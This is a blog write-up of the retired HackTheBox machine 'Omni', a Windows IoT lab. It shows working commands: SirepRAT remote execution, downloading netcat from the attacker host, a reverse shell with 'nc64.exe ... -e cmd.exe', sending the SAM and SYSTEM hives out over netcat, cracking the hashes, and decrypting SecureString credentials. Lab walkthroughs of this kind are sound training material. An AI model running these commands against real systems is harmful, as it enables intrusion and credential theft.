<!DOCTYPE html>
<html class="no-js">
<head>
    <meta charset="utf-8">
    <title>HTB: Omni | maggick's logs</title>

    <meta name="author" content="maggick">
    <meta name="description" content="">
    <meta name="robots" content="">
        <meta name="keywords" content="">
        <meta property="og:title" content="">
        <meta property="og:description" content="">
        <meta property="og:url" content="">
        <meta property="og:image" content="">
    <meta property="og:site_name" content="maggick's logs">
    <meta property="og:type" content="website">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">

        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">

    <link rel="canonical" href="">

    <link rel="stylesheet" href="../../theme/css/pure-min.css">
    <link rel="stylesheet" href="../../theme/css/main.css">
</head>
<body>
<div id="page" class="full-entry">
    <header class="pure-g-r header">
        <div class="pure-u-1">
            <div class="wrapper">
                <div class="l-box">
                    <a href="../../index.html" title="Home page"
                            class="logo">maggick's
<span class="secondary">logs</span>                    </a>
                </div>
            </div>

<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
    <ul>
            <li>
              |
            </li>
                <li>
                    <a href="../../pages/about.html">About</a>
                </li>
                <li>
                    <a href="../../pages/notes.html">Notes</a>
                </li>
    </ul>
</nav>        </div>
    </header>

    <div class="pure-g-r wrapper">
        <section class="content pure-u-17-24">
            <div class="l-box">

<article class="entry">

    <header class="entry-header">
        <h1 class="entry-title">
      <a href="../../2021/02/htb-omni.html" title="Read more" class="entry-title-link">
                HTB: Omni</a>
        </h1>

        <div class="entry-date">
            <time datetime="2021-02-07T18:15:00+01:00">07 Feb 2021</time>
        </div>

    <div class="entry-meta">
      <span class="meta entry-author">
        <span class="icons icons-author"></span>
        <a href="../../author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
      </span>

      <span class="meta entry-tags">
        <span class="icons icons-category"></span>
          <a href="../../tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
          <a href="../../tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
          <a href="../../tag/htb.html" title="Read more with the label HTB" class="meta-link">HTB</a> 
          <a href="../../tag/windows.html" title="Read more with the label Windows" class="meta-link">Windows</a> 
          <a href="../../tag/iot.html" title="Read more with the label IOT" class="meta-link">IOT</a> 
      </span>
              <span class="meta entry-tags">
              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 11 minutes</p></span>
    </div>
    </header>

    <div class="entry-content">
            <p><img class="align-left" src="/media/2021.02/omni_card.png" alt="Omni Card" width="262"></p>
<p>This is a writeup about a retired HacktheBox machine:
<a href="https://www.hackthebox.com/home/machines/profile/271">Omni</a> publish on
August 22, 2020 by
<a href="https://www.hackthebox.com/home/users/profile/1190">egre55</a>.
This box is rated as easy box. I was mostly intrigue by the "Other" operating
system. It implies some Google search, a RAT and SecureStrings.</p>


<h1 id="user">User</h1>
<h2 id="recon">Recon</h2>
<p>Let us start as always by a <code>nmap</code> scan. The box is quit busy so first of all we
run a simple aggressive TCP scan:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.80 scan initiated Mon Aug 31 11:13:25 2020 as: nmap -p- -oN nmap -sSV 10.10.10.204</span>
<span class="code-line">Nmap scan report for 10.10.10.204</span>
<span class="code-line">Host is up (0.079s latency).</span>
<span class="code-line">Not shown: 65529 filtered ports</span>
<span class="code-line">PORT      STATE SERVICE  VERSION</span>
<span class="code-line">135/tcp   open  msrpc    Microsoft Windows RPC</span>
<span class="code-line">5985/tcp  open  upnp     Microsoft IIS httpd</span>
<span class="code-line">8080/tcp  open  upnp     Microsoft IIS httpd</span>
<span class="code-line">29817/tcp open  unknown</span>
<span class="code-line">29819/tcp open  arcserve ARCserve Discovery</span>
<span class="code-line">29820/tcp open  unknown</span>
<span class="code-line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span>
<span class="code-line">SF-Port29820-TCP:V=7.80%I=7%D=8/25%Time=5F452B08%P=x86_64-pc-linux-gnu%r(N</span>
<span class="code-line">SF:ULL,10,&quot;\*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12&quot;)%r(GenericLines,10,&quot;</span>
<span class="code-line">SF:\*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12&quot;)%r(Help,10,&quot;\*LY\xa5\xfb`\x0</span>
<span class="code-line">SF:4G\xa9m\x1c\xc9}\xc8O\x12&quot;)%r(JavaRMI,10,&quot;\*LY\xa5\xfb`\x04G\xa9m\x1c\x</span>
<span class="code-line">SF:c9}\xc8O\x12&quot;);</span>
<span class="code-line">Service Info: Host: PING; OS: Windows; CPE: cpe:/o:microsoft:windows</span>
<span class="code-line"></code></pre></div>

<p>This look like a Windows Server with some strange open ports. When trying to
access the web service on port 8080 we got a basic auth with the message
"Windows Device Portal". We google to find the default user and password
<code>administrator:p@ssw0rd</code> but they don't work here. So we google for just "Windows Device Portal".</p>
<p>We learn that this is a Windows IOT operating system. We search for "Windows IOT exploit"
but that lead us to a lot of general media article. So we specify our search to
"Windows IOT exploit github". We found some <a href="https://github.com/SafeBreach-Labs/SirepRAT">python code to exploit the Sirep
service</a>.</p>
<h2 id="rce-and-reverse-shell">RCE and reverse shell</h2>
<p>We install the python2 dependencies and quickly realize that there is a bug with the <code>enum</code> library.
A few Google search told us that we need to use the <code>aenum</code> library instead of <code>enum</code>
So we modify each <code>from enum import Enum</code> to <code>from aenum import Enum</code>.</p>
<p>Then we can use the tool to execute command on the system. After a few classic
commands we upload netcat (<code>/usr/share/windows-binaries/nc.exe</code>)
to the box using the python HTTP server (<code>python3 -m http.server</code>) and writing
it directly in <code>C:\</code>. Then we run it to get a reverse shell, but this trigger an error as out netcat is a 32bits
binary.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd &quot;C:\Windows\System32\cmd.exe&quot; --args &quot; /c PowerShell Invoke-WebRequest -OutFile C:\\nc.exe -Uri http://10.10.14.119:8000/nc.exe&quot; --v</span>
<span class="code-line"></span>
<span class="code-line">kali@kali:~/SirepRAT$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd &quot;C:\Windows\System32\cmd.exe&quot; --args &quot; /c C:\\nc.exe 10.10.14.119 1234 -e cmd.exe&quot; --v---------</span>
<span class="code-line">This version of C:\nc.exe is not compatible with the version of Windows you&#39;re running. Check your computer&#39;s system information and then contact the software publisher.</span>
<span class="code-line"></code></pre></div>

<p>We download nc64.exe from the
<a href="https://github.com/int0x33/nc.exe/raw/master/nc64.exe">internet</a>,
re-upload it and run it again.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~/pown/htb_omni/SirepRAT$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd &quot;C:\Windows\System32\cmd.exe&quot; --args &quot; /c PowerShell Invoke-WebRequest -OutFile C:\\nc64.exe -Uri http://10.10.14.119:8000/nc64.exe&quot;</span>
<span class="code-line">kali@kali:~/pown/htb_omni/SirepRAT$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd &quot;C:\Windows\System32\cmd.exe&quot; --args &quot; /c C:\\nc64.exe 10.10.14.119 1234 -e cmd.exe&quot;</span>
<span class="code-line"></code></pre></div>

<p>We run a netcat listener at the same time and get a shell as <code>NT/SYTSEM</code></p>
<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:/tmp/srv$ nc -l -p 1234</span>
<span class="code-line">Microsoft Windows [Version 10.0.17763.107]</span>
<span class="code-line">Copyright (c) Microsoft Corporation. All rights reserved.</span>
<span class="code-line"></span>
<span class="code-line">C:\windows\system32&gt;echo %username% </span>
<span class="code-line">echo %username%</span>
<span class="code-line">omni$</span>
<span class="code-line"></span>
<span class="code-line">C:\windows\system32&gt;Powershell</span>
<span class="code-line">Powershell</span>
<span class="code-line">Windows PowerShell </span>
<span class="code-line">Copyright (C) Microsoft Corporation. All rights reserved.</span>
<span class="code-line"></span>
<span class="code-line">PS C:\windows\system32&gt; [System.Security.Principal.WindowsIdentity]::GetCurrent().Name</span>
<span class="code-line">[System.Security.Principal.WindowsIdentity]::GetCurrent().Name</span>
<span class="code-line">NT AUTHORITY\SYSTEM</span>
<span class="code-line"></code></pre></div>

<p>As we are system we could access all file on the system. We found <code>user.txt</code> and
<code>root.txt</code> in <code>C:\Data\Users\app</code> and <code>C:\Data\Users\Adminsitrator</code> but the
content of the file is an <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring?view=powershell-7#example-2--create-a-secure-string-from-an-encrypted-string-in-a-file">Encrypted
String</a>.
We will need to be the <code>app</code> and <code>administrator</code> users to decrypt the files. We
also notice the <code>hardening.txt</code> and <code>iot-admin.xml</code> files. The first one is just
a text file with some (unimportant) informations about the box's configuration.
The second one seems to be the <code>administrator</code> user's password as an Encrypted
String. So once we are the <code>app</code> user we would quickly be able to get the user
flag and the <code>administrator</code> password.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>C:\windows\system32&gt;cd C:\Data</span>
<span class="code-line">cd C:\Data</span>
<span class="code-line"></span>
<span class="code-line">C:\Data&gt;dir</span>
<span class="code-line">dir</span>
<span class="code-line">Volume in drive C is MainOS</span>
<span class="code-line">Volume Serial Number is 3C37-C677</span>
<span class="code-line"></span>
<span class="code-line">Directory of C:\Data</span>
<span class="code-line"></span>
<span class="code-line">10/26/2018  11:37 PM    &lt;DIR&gt;          CrashDump</span>
<span class="code-line">07/04/2020  12:22 AM                 0 FirstBoot.Complete</span>
<span class="code-line">10/26/2018  11:37 PM    &lt;DIR&gt;          Logfiles</span>
<span class="code-line">10/26/2018  11:37 PM    &lt;DIR&gt;          Programs</span>
<span class="code-line">07/03/2020  11:22 PM    &lt;DIR&gt;          SharedData</span>
<span class="code-line">07/03/2020  11:22 PM    &lt;DIR&gt;          SystemData</span>
<span class="code-line">10/26/2018  11:38 PM    &lt;DIR&gt;          test</span>
<span class="code-line">07/04/2020  07:28 PM    &lt;DIR&gt;          Users</span>
<span class="code-line">10/26/2018  11:38 PM    &lt;DIR&gt;          Windows</span>
<span class="code-line">              1 File(s)              0 bytes</span>
<span class="code-line">              8 Dir(s)   4,691,017,728 bytes free</span>
<span class="code-line"></span>
<span class="code-line">C:\Data&gt;cd Users\app</span>
<span class="code-line">cd Users\app</span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line">C:\Data\Users\app&gt;dir</span>
<span class="code-line">dir</span>
<span class="code-line">Volume in drive C is MainOS</span>
<span class="code-line">Volume Serial Number is 3C37-C677</span>
<span class="code-line"></span>
<span class="code-line">Directory of C:\Data\Users\app</span>
<span class="code-line"></span>
<span class="code-line">07/04/2020  09:53 PM    &lt;DIR&gt;          .</span>
<span class="code-line">07/04/2020  09:53 PM    &lt;DIR&gt;          ..</span>
<span class="code-line">07/04/2020  07:28 PM    &lt;DIR&gt;          3D Objects</span>
<span class="code-line">07/04/2020  07:28 PM    &lt;DIR&gt;          Documents</span>
<span class="code-line">07/04/2020  07:28 PM    &lt;DIR&gt;          Downloads</span>
<span class="code-line">07/04/2020  07:28 PM    &lt;DIR&gt;          Favorites</span>
<span class="code-line">07/04/2020  08:20 PM               344 hardening.txt</span>
<span class="code-line">07/04/2020  08:14 PM             1,858 iot-admin.xml</span>
<span class="code-line">07/04/2020  07:28 PM    &lt;DIR&gt;          Music</span>
<span class="code-line">07/04/2020  07:28 PM    &lt;DIR&gt;          Pictures</span>
<span class="code-line">07/04/2020  09:53 PM             1,958 user.txt</span>
<span class="code-line">07/04/2020  07:28 PM    &lt;DIR&gt;          Videos</span>
<span class="code-line">              3 File(s)          4,160 bytes</span>
<span class="code-line">              9 Dir(s)   4,691,017,728 bytes free</span>
<span class="code-line"></span>
<span class="code-line">C:\Data\Users\app&gt;type hardening</span>
<span class="code-line">type hardening</span>
<span class="code-line">The system cannot find the file specified.</span>
<span class="code-line"></span>
<span class="code-line">C:\Data\Users\app&gt;type hardening.txt</span>
<span class="code-line">type hardening.txt</span>
<span class="code-line">- changed default administrator password of &quot;p@ssw0rd&quot;</span>
<span class="code-line">- added firewall rules to restrict unnecessary services</span>
<span class="code-line">- removed administrator account from &quot;Ssh Users&quot; group</span>
<span class="code-line"></code></pre></div>

<h2 id="dumping-hashes">Dumping hashes</h2>
<p>As we are <code>SYSTEM</code> we can dump the <code>SYSTEM</code> and <code>SAM</code> hive to extract the users
passwords' hashes with <code>reg save</code>. We then transfer them to our Kali box using
netcat.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>C:\windows\system32&gt;reg save hklm\system C:\system</span>
<span class="code-line">reg save hklm\system C:\system</span>
<span class="code-line">The operation completed successfully.</span>
<span class="code-line"></span>
<span class="code-line">C:\windows\system32&gt; reg save hklm\sam c:\sam</span>
<span class="code-line">reg save hklm\sam c:\sam</span>
<span class="code-line">The operation completed successfully.</span>
<span class="code-line"></span>
<span class="code-line">C:\windows\system32&gt;cd c:\</span>
<span class="code-line">cd c:\</span>
<span class="code-line"></span>
<span class="code-line">c:\&gt;nc64.exe 10.10.14.119 1235 &lt; system</span>
<span class="code-line">nc64.exe 10.10.14.119 1235 &lt; system</span>
<span class="code-line"></span>
<span class="code-line">c:\&gt;nc64.exe 10.10.14.119 1235 &lt; sam</span>
<span class="code-line">nc64.exe 10.10.14.119 1235 &lt; sam</span>
<span class="code-line"></code></pre></div>

<h2 id="cracking-hashes">Cracking hashes</h2>
<p>Once transfered we use <a href="https://github.com/SecureAuthCorp/impacket">impacket's</a>
secret dump to extract the hashes from the <code>SAM</code> and <code>SYSTEM</code> files.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~/installed_tools/impacket/examples$ python3 secretsdump.py -sam ~/pown/sam -system ~/pown/system -outputfile out LOCAL</span>
<span class="code-line">Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation</span>
<span class="code-line"></span>
<span class="code-line">[*] Target system bootKey: 0x4a96b0f404fd37b862c07c2aa37853a5</span>
<span class="code-line">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)</span>
<span class="code-line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:a01f16a7fa376962dbeb29a764a06f00:::</span>
<span class="code-line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span>
<span class="code-line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span>
<span class="code-line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:330fe4fd406f9d0180d67adb0b0dfa65:::</span>
<span class="code-line">sshd:1000:aad3b435b51404eeaad3b435b51404ee:91ad590862916cdfd922475caed3acea:::</span>
<span class="code-line">DevToolsUser:1002:aad3b435b51404eeaad3b435b51404ee:1b9ce6c5783785717e9bbb75ba5f9958:::</span>
<span class="code-line">app:1003:aad3b435b51404eeaad3b435b51404ee:e3cb0651718ee9b4faffe19a51faff95:::</span>
<span class="code-line">[*] Cleaning up...</span>
<span class="code-line"></code></pre></div>

<p>We run john on the collected hashes and get the <code>app</code> user password.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>[maggick@fomalhaut htb_omni]$ john hash -w=~/tools/password_lists/rockyou.txt --fork=8 --rules --format=NT</span>
<span class="code-line">Using default input encoding: UTF-8</span>
<span class="code-line">Loaded 6 password hashes with no different salts (NT [MD4 128/128 AVX 4x3])</span>
<span class="code-line">Node numbers 1-8 of 8 (fork)</span>
<span class="code-line">Each node loaded 1/8 of wordfile to memory (about 16 MB/node)</span>
<span class="code-line">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span>
<span class="code-line">                (Guest)</span>
<span class="code-line">mesh5143         (app)</span>
<span class="code-line">7 1g 0:00:00:09 DONE (2020-08-28 11:14) 0.1009g/s 2951Kp/s 2951Kc/s 14755KC/s Aateetaing..Aaaaaaaaaaaawing</span>
<span class="code-line">5 1g 0:00:00:09 DONE (2020-08-28 11:14) 0.1005g/s 2939Kp/s 2939Kc/s 14769KC/s Abbyramying..Aaaaaaaaaaaaing</span>
<span class="code-line">2 0g 0:00:00:10 DONE (2020-08-28 11:14) 0g/s 2921Kp/s 2921Kc/s 17530KC/s Aanyahing..Aaaaaaaaaaaaaaaaaaaaaaaaain</span>
<span class="code-line">6 0g 0:00:00:10 DONE (2020-08-28 11:14) 0g/s 2921Kp/s 2921Kc/s 17529KC/s Abdelaing..Aaaaazing</span>
<span class="code-line">4 0g 0:00:00:10 DONE (2020-08-28 11:14) 0g/s 2912Kp/s 2912Kc/s 17475KC/s Aberdaying..Aaaaaaaaaaaaaaaing</span>
<span class="code-line">3 0g 0:00:00:10 DONE (2020-08-28 11:14) 0g/s 2909Kp/s 2909Kc/s 17456KC/s Abgboing..Aaaaaaaaaaaaaaaaaaaaaing</span>
<span class="code-line">8 0g 0:00:00:10 DONE (2020-08-28 11:14) 0g/s 2897Kp/s 2897Kc/s 17382KC/s Abeloliving..Aaaaaaaaaaaaaaaaaaaaaaaaaaa</span>
<span class="code-line">1 0g 0:00:00:10 DONE (2020-08-28 11:14) 0g/s 2855Kp/s 2855Kc/s 17130KC/s Abigayling..Soleiling</span>
<span class="code-line"></code></pre></div>

<p>We then connect to the web service on port 8080 using this credentials. There is
specific page to run command.</p>
<p><img alt="User interface" src="/media/2021.02/omni_01.png"></p>
<p>We just run netcat to get a reverse shell as <code>app</code></p>
<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~$ nc -l -p 1234</span>
<span class="code-line">Microsoft Windows [Version 10.0.17763.107]</span>
<span class="code-line">Copyright (c) Microsoft Corporation. All rights reserved.</span>
<span class="code-line"></span>
<span class="code-line">C:\windows\system32&gt;echo %username%</span>
<span class="code-line">app</span>
<span class="code-line"></code></pre></div>

<h2 id="encrypted-strings">Encrypted Strings</h2>
<p>We go back to the <code>app</code>'s user data folder, and use
<a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring?view=powershell-7#example-2--create-a-secure-string-from-an-encrypted-string-in-a-file">Microsoft documentation</a>
to decrypt the user flag.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>C:\windows\system32&gt;cd C:\Data\Users\app</span>
<span class="code-line"></span>
<span class="code-line">C:\Data\Users\app&gt;type user.txt</span>
<span class="code-line">type user.txt</span>
<span class="code-line">&lt;Objs Version=&quot;1.1.0.1&quot; xmlns=&quot;http://schemas.microsoft.com/powershell/2004/04&quot;&gt;</span>
<span class="code-line">  &lt;Obj RefId=&quot;0&quot;&gt;</span>
<span class="code-line">    &lt;TN RefId=&quot;0&quot;&gt;</span>
<span class="code-line">      &lt;T&gt;System.Management.Automation.PSCredential&lt;/T&gt;</span>
<span class="code-line">      &lt;T&gt;System.Object&lt;/T&gt;</span>
<span class="code-line">    &lt;/TN&gt;</span>
<span class="code-line">    &lt;ToString&gt;System.Management.Automation.PSCredential&lt;/ToString&gt;</span>
<span class="code-line">    &lt;Props&gt;</span>
<span class="code-line">      &lt;S N=&quot;UserName&quot;&gt;flag&lt;/S&gt;</span>
<span class="code-line">      &lt;SS N=&quot;Password&quot;&gt;01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7&lt;/SS&gt;</span>
<span class="code-line">    &lt;/Props&gt;</span>
<span class="code-line">  &lt;/Obj&gt;</span>
<span class="code-line">&lt;/Objs&gt;</span>
<span class="code-line"></span>
<span class="code-line">C:\Data\Users\app&gt;Powershell</span>
<span class="code-line">Windows PowerShell</span>
<span class="code-line">Copyright (C) Microsoft Corporation. All rights reserved.</span>
<span class="code-line">PS C:\Data\Users\app&gt; $Secure2 = ConvertTo-SecureString -String &#39;01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7&#39;</span>
<span class="code-line"></span>
<span class="code-line">PS C:\Data\Users\app&gt; $credential = New-Object System.Management.Automation.PSCredential (&#39;root&#39;, $Secure2)</span>
<span class="code-line">PS C:\Data\Users\app&gt; $credential.GetNetworkCredential().Password</span>
<span class="code-line">$credential.GetNetworkCredential().Password</span>
<span class="code-line">7cfd50f6bc34db3204898f1505ad9d70</span>
<span class="code-line"></code></pre></div>

<h1 id="root">Root</h1>
<p>We do exactly the same with the <code>iot-admin.xml</code> file to retrieve the
administrator password.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>C:\Data\Users\app&gt;type iot-admin.xml</span>
<span class="code-line">type iot-admin.xml</span>
<span class="code-line">&lt;Objs Version=&quot;1.1.0.1&quot; xmlns=&quot;http://schemas.microsoft.com/powershell/2004/04&quot;&gt;</span>
<span class="code-line">  &lt;Obj RefId=&quot;0&quot;&gt;</span>
<span class="code-line">    &lt;TN RefId=&quot;0&quot;&gt;</span>
<span class="code-line">      &lt;T&gt;System.Management.Automation.PSCredential&lt;/T&gt;</span>
<span class="code-line">      &lt;T&gt;System.Object&lt;/T&gt;</span>
<span class="code-line">    &lt;/TN&gt;</span>
<span class="code-line">    &lt;ToString&gt;System.Management.Automation.PSCredential&lt;/ToString&gt;</span>
<span class="code-line">    &lt;Props&gt;</span>
<span class="code-line">      &lt;S N=&quot;UserName&quot;&gt;omni\administrator&lt;/S&gt;</span>
<span class="code-line">      &lt;SS N=&quot;Password&quot;&gt;01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa28853640000000002000000000010660000000100002000000000855856bea37267a6f9b37f9ebad14e910d62feb252fdc98a48634d18ae4ebe000000000e80000000020000200000000648cd59a0cc43932e3382b5197a1928ce91e87321c0d3d785232371222f554830000000b6205d1abb57026bc339694e42094fd7ad366fe93cbdf1c8c8e72949f56d7e84e40b92e90df02d635088d789ae52c0d640000000403cfe531963fc59aa5e15115091f6daf994d1afb3c2643c945f2f4b8f15859703650f2747a60cf9e70b56b91cebfab773d0ca89a57553ea1040af3ea3085c27&lt;/SS&gt;</span>
<span class="code-line">    &lt;/Props&gt;</span>
<span class="code-line">  &lt;/Obj&gt;</span>
<span class="code-line">&lt;/Objs&gt;</span>
<span class="code-line">PS C:\Data\Users\app&gt; $Secure2 = ConvertTo-SecureString -String &#39;01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa28853640000000002000000000010660000000100002000000000855856bea37267a6f9b37f9ebad14e910d62feb252fdc98a48634d18ae4ebe000000000e80000000020000200000000648cd59a0cc43932e3382b5197a1928ce91e87321c0d3d785232371222f554830000000b6205d1abb57026bc339694e42094fd7ad366fe93cbdf1c8c8e72949f56d7e84e40b92e90df02d635088d789ae52c0d640000000403cfe531963fc59aa5e15115091f6daf994d1afb3c2643c945f2f4b8f15859703650f2747a60cf9e70b56b91cebfab773d0ca89a57553ea1040af3ea3085c27&#39;</span>
<span class="code-line">PS C:\Data\Users\app&gt; $credential = New-Object System.Management.Automation.PSCredential (&#39;root&#39;, $Secure2)</span>
<span class="code-line">$credential = New-Object System.Management.Automation.PSCredential (&#39;root&#39;, $Secure2)</span>
<span class="code-line">PS C:\Data\Users\app&gt; $credential.GetNetworkCredential().Password</span>
<span class="code-line">$credential.GetNetworkCredential().Password</span>
<span class="code-line">_1nt3rn37ofTh1nGz</span>
<span class="code-line"></code></pre></div>

<p>We once more connect to the web application on port 8080 and execute netcat to
get a reverse shell as <code>administrator</code>. And we use the above method to decrypt the root
flag.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~$ nc -l -p 1234</span>
<span class="code-line">Microsoft Windows [Version 10.0.17763.107]</span>
<span class="code-line">Copyright (c) Microsoft Corporation. All rights reserved.</span>
<span class="code-line"></span>
<span class="code-line">C:\windows\system32&gt;echo %username%</span>
<span class="code-line">echo %username%</span>
<span class="code-line">Administrator</span>
<span class="code-line"></span>
<span class="code-line">C:\windows\system32&gt;cd &quot;C:\Data\Users\administrator\</span>
<span class="code-line">cd &quot;C:\Data\Users\administrator\</span>
<span class="code-line"></span>
<span class="code-line">C:\Data\Users\administrator&gt;dir</span>
<span class="code-line">dir</span>
<span class="code-line">Volume in drive C is MainOS</span>
<span class="code-line">Volume Serial Number is 3C37-C677</span>
<span class="code-line"></span>
<span class="code-line">Directory of C:\Data\Users\administrator</span>
<span class="code-line"></span>
<span class="code-line">07/04/2020  09:48 PM    &lt;DIR&gt;          .</span>
<span class="code-line">07/04/2020  09:48 PM    &lt;DIR&gt;          ..</span>
<span class="code-line">07/03/2020  11:23 PM    &lt;DIR&gt;          3D Objects</span>
<span class="code-line">07/03/2020  11:23 PM    &lt;DIR&gt;          Documents</span>
<span class="code-line">07/03/2020  11:23 PM    &lt;DIR&gt;          Downloads</span>
<span class="code-line">07/03/2020  11:23 PM    &lt;DIR&gt;          Favorites</span>
<span class="code-line">07/03/2020  11:23 PM    &lt;DIR&gt;          Music</span>
<span class="code-line">07/03/2020  11:23 PM    &lt;DIR&gt;          Pictures</span>
<span class="code-line">07/04/2020  09:48 PM             1,958 root.txt</span>
<span class="code-line">07/03/2020  11:23 PM    &lt;DIR&gt;          Videos</span>
<span class="code-line">              1 File(s)          1,958 bytes</span>
<span class="code-line">              9 Dir(s)   4,691,116,032 bytes free</span>
<span class="code-line"></span>
<span class="code-line">C:\Data\Users\administrator&gt;type root.txt</span>
<span class="code-line">type root.txt</span>
<span class="code-line">&lt;Objs Version=&quot;1.1.0.1&quot; xmlns=&quot;http://schemas.microsoft.com/powershell/2004/04&quot;&gt;</span>
<span class="code-line">  &lt;Obj RefId=&quot;0&quot;&gt;</span>
<span class="code-line">    &lt;TN RefId=&quot;0&quot;&gt;</span>
<span class="code-line">      &lt;T&gt;System.Management.Automation.PSCredential&lt;/T&gt;</span>
<span class="code-line">      &lt;T&gt;System.Object&lt;/T&gt;</span>
<span class="code-line">    &lt;/TN&gt;</span>
<span class="code-line">    &lt;ToString&gt;System.Management.Automation.PSCredential&lt;/ToString&gt;</span>
<span class="code-line">    &lt;Props&gt;</span>
<span class="code-line">      &lt;S N=&quot;UserName&quot;&gt;flag&lt;/S&gt;</span>
<span class="code-line">      &lt;SS N=&quot;Password&quot;&gt;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000011d9a9af9398c648be30a7dd764d1f3a000000000200000000001066000000010000200000004f4016524600b3914d83c0f88322cbed77ed3e3477dfdc9df1a2a5822021439b000000000e8000000002000020000000dd198d09b343e3b6fcb9900b77eb64372126aea207594bbe5bb76bf6ac5b57f4500000002e94c4a2d8f0079b37b33a75c6ca83efadabe077816aa2221ff887feb2aa08500f3cf8d8c5b445ba2815c5e9424926fca73fb4462a6a706406e3fc0d148b798c71052fc82db4c4be29ca8f78f0233464400000008537cfaacb6f689ea353aa5b44592cd4963acbf5c2418c31a49bb5c0e76fcc3692adc330a85e8d8d856b62f35d8692437c2f1b40ebbf5971cd260f738dada1a7&lt;/SS&gt;</span>
<span class="code-line">    &lt;/Props&gt;</span>
<span class="code-line">  &lt;/Obj&gt;</span>
<span class="code-line">&lt;/Objs&gt;</span>
<span class="code-line"></span>
<span class="code-line">C:\Data\Users\administrator&gt;Powershell</span>
<span class="code-line">Powershell</span>
<span class="code-line">Windows PowerShell</span>
<span class="code-line">Copyright (C) Microsoft Corporation. All rights reserved.</span>
<span class="code-line"></span>
<span class="code-line">PS C:\Data\Users\administrator&gt; $Secure2 = ConvertTo-SecureString -String &#39;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000011d9a9af9398c648be30a7dd764d1f3a000000000200000000001066000000010000200000004f4016524600b3914d83c0f88322cbed77ed3e3477dfdc9df1a2a5822021439b000000000e8000000002000020000000dd198d09b343e3b6fcb9900b77eb64372126aea207594bbe5bb76bf6ac5b57f4500000002e94c4a2d8f0079b37b33a75c6ca83efadabe077816aa2221ff887feb2aa08500f3cf8d8c5b445ba2815c5e9424926fca73fb4462a6a706406e3fc0d148b798c71052fc82db4c4be29ca8f78f0233464400000008537cfaacb6f689ea353aa5b44592cd4963acbf5c2418c31a49bb5c0e76fcc3692adc330a85e8d8d856b62f35d8692437c2f1b40ebbf5971cd260f738dada1a7&#39;</span>
<span class="code-line">PS C:\Data\Users\administrator&gt; $credential = New-Object System.Management.Automation.PSCredential (&#39;root&#39;, $Secure2)</span>
<span class="code-line">PS C:\Data\Users\administrator&gt; $credential.GetNetworkCredential().Password</span>
<span class="code-line">$credential.GetNetworkCredential().Password</span>
<span class="code-line">5dbdce5569e2c4708617c0ce6e9bf11d</span>
